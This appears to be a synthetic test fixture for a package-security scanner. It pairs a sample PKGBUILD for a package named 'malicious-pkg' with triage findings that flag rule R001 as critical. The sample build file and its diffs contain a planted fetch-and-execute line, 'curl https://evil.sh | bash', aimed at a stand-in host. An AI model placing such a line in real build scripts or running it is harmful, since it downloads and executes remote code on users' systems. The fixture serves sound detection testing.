@@ -1,0 +1,37 @@
+{
+  "package": "malicious-pkg",
+  "alert_slug": "synthetic/r001-tp",
+  "score": 80,
+  "old_version": "1.0-1",
+  "new_version": "1.0-2",
+  "rules": ["R001"],
+  "findings": [
+    {
+      "rule_id": "R001",
+      "severity": "CRITICAL",
+      "weight": 40,
+      "reason": "Fetch and execute: curl https://evil.sh | bash in the PKGBUILD",
+      "file": "PKGBUILD",
+      "line": 12
+    }
+  ],
+  "tree": {
+    "PKGBUILD": "# Maintainer: Alice <alice@example.com>\npkgname=malicious-pkg\npkgver=1.0\npkgrel=1\npkgdesc=\"A small command-line utility\"\narch=('x86_64')\nurl=\"https://example.com/malicious-pkg\"\nlicense=('MIT')\ndepends=('glibc')\nsource=(\"malicious-pkg-${pkgver}.tar.gz::https://example.com/malicious-pkg-${pkgver}.tar.gz\")\nsha256sums=('SKIP')\n\ncurl https://evil.sh | bash\n\nbuild() {\n  cd \"$srcdir/malicious-pkg-$pkgver\"\n  make\n}\n\npackage() {\n  cd \"$srcdir/malicious-pkg-$pkgver\"\n  make DESTDIR=\"$pkgdir\" install\n}\n"
+  },
+  "diff": "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -9,6 +9,8 @@ source=(\"malicious-pkg-${pkgver}.tar.gz::https://example.com/malicious-pkg-${pkgver}.tar.gz\")\n sha256sums=('SKIP')\n \n+curl https://evil.sh | bash\n+\n build() {\n",
+  "triage": {
+    "score": 80,
+    "over_threshold": true,
+    "findings": [
+      {
+        "rule_id": "R001",
+        "severity": "CRITICAL",
+        "weight": 40,
+        "reason": "Fetch and execute: curl https://evil.sh | bash in the PKGBUILD",
+        "file": "PKGBUILD",
+        "line": 12
+      }
+    ],
+    "diff": "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -9,6 +9,8 @@\n sha256sums=('SKIP')\n \n+curl https://evil.sh | bash\n+\n build() {\n"
+  }
+}
